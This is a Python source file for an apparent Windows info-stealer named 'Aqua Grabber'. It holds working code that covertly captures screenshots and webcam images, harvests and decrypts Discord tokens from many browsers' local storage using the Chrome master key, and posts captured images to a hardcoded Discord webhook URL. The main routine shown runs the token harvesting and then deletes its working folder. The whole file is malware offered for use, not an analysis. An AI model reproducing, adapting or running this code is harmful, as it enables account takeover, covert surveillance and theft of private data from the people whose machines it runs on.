import base64
import json
import os
import re
import shutil
import glob
import subprocess
import cv2
import win32com.client
import requests

from PIL import Image
from discord_webhook import DiscordWebhook, DiscordEmbed
from mss import mss
from Cryptodome.Cipher import AES
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

user = os.environ.get("USERNAME")
appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
Aqua = "C:/Users/Public/Aqua"


def get_HWID():
    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
    return current_machine_id


def makeDir():
    if not os.path.exists('C:/Users/Public/Aqua'):
        os.mkdir("C:/Users/Public/Aqua")
    if not os.path.exists('C:/Users/Public/Aqua/ss'):
        os.mkdir("C:/Users/Public/Aqua/ss")
    if not os.path.exists('C:/Users/Public/Aqua/Cam'):
        os.mkdir("C:/Users/Public/Aqua/Cam")
    if not os.path.exists('C:/Users/Public/Aqua/Info'):
        os.mkdir("C:/Users/Public/Aqua/Info")


def takeSS():
    for i in range(50):
        with mss() as sct:
            sct.shot(mon=-1, output=f"{Aqua}/ss/{i}.png")
            print(f"Done SS Number {i}")

    frame_folder = f'{Aqua}/ss'

    def make_gif():
        frames = [Image.open(image) for image in glob.glob(f"{frame_folder}/*")]
        frame_one = frames[0]
        frame_one.save(f"{Aqua}/ss/SS.gif", format="GIF", append_images=frames,
                       save_all=True, duration=100, loop=1)

    make_gif()
    with open(f'{Aqua}/ss/SS.gif', 'rb') as f:
        file_data = f.read()
    webhook.content = f'```{user} | ScreenShot | HWID: {get_HWID()}```'
    webhook.add_file(file_data, f'Aqua_{user}_SS.gif')
    print("Done Taking ScreenShots")
    webhook.execute()
    webhook.remove_files()


def getCam():
    try:
        test = 0
        wmi = win32com.client.GetObject("winmgmts:")
        for usb in wmi.InstancesOf("Win32_USBHub"):
            if str(usb.DeviceID).startswith("USB\VID"):
                test = test + 1
            else:
                pass
        for x in range(test):
            try:
                camera = cv2.VideoCapture(x)
                for i in range(1):
                    return_value, image = camera.read()
                    cv2.imwrite(f'{Aqua}/Cam/{str(x)}.png', image)
                    print(f"Webcam[{x}] Done Pic " + str(i))
                del camera
                webhook.content = f'```{user} | Webcam Number {x} | HWID: {get_HWID()}```'
                with open(f'{Aqua}/Cam/{x}.png', 'rb') as f:
                    file_data = f.read()
                webhook.add_file(file_data, f'Aqua_{user}_Cam_{x}.png')
                print(f"Done Grabbing Webcam Numb {x}")
                webhook.execute()
                webhook.remove_files()
            except:
                webhook.content = f'```{user} | Failed To Grab Webcam {x} | HWID: {get_HWID()}```'
                print(f"Failed Webcam Numb {x}")
                webhook.execute()
                webhook.remove_files()
    except:
        webhook.content = f'```{user} | Webcam Grab Unknown Error | HWID: {get_HWID()}```'
        print(f"Unknown Error")
        webhook.execute()
        webhook.remove_files()


def getDcToken():
    base_url = "https://discord.com/api/v9/users/@me"
    regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
    regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

    tokens, uids = [], []

    def extract() -> None:
        paths = {
            'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(roaming + f'\\{_discord}\\Local State'):
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if
                                 x.strip()]:
                        for y in re.findall(regexp_enc, line):
                            token = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(roaming + f'\\{_discord}\\Local State'))

                            if validate_token(token):
                                uid = requests.get(base_url, headers={
                                    'Authorization': token}).json()['id']
                                if uid not in uids:
                                    tokens.append(token)
                                    uids.append(uid)

            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if
                                 x.strip()]:
                        for token in re.findall(regexp, line):
                            if validate_token(token):
                                uid = requests.get(base_url, headers={
                                    'Authorization': token}).json()['id']
                                if uid not in uids:
                                    tokens.append(token)
                                    uids.append(uid)

        if os.path.exists(roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(regexp, line):
                            if validate_token(token):
                                uid = requests.get(base_url, headers={
                                    'Authorization': token}).json()['id']
                                if uid not in uids:
                                    tokens.append(token)
                                    uids.append(uid)

    def validate_token(token: str) -> bool:
        print(token)
        r = requests.get(base_url, headers={'Authorization': token})

        if r.status_code == 200:
            return True

        return False

    def decrypt_val(buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_master_key(path: str) -> str:
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

        return master_key

    print(extract())


# Clean Up
def cleanUp():
    shutil.rmtree(Aqua)


webhook_url = 'https://discord.com/api/webhooks/1179117412684144730/LMVjJt1kDo4HxB1hc0A79bXa-Ji8Fbk7lSDx2O7KVc9ni6Rg3_-GsZynCfWB7-mDo6rj'
webhook = DiscordWebhook(url=webhook_url)
embed = DiscordEmbed()
webhook.username = "Aqua Grabber"


def runAqua():
    makeDir()
    getDcToken()
    cleanUp()


runAqua()
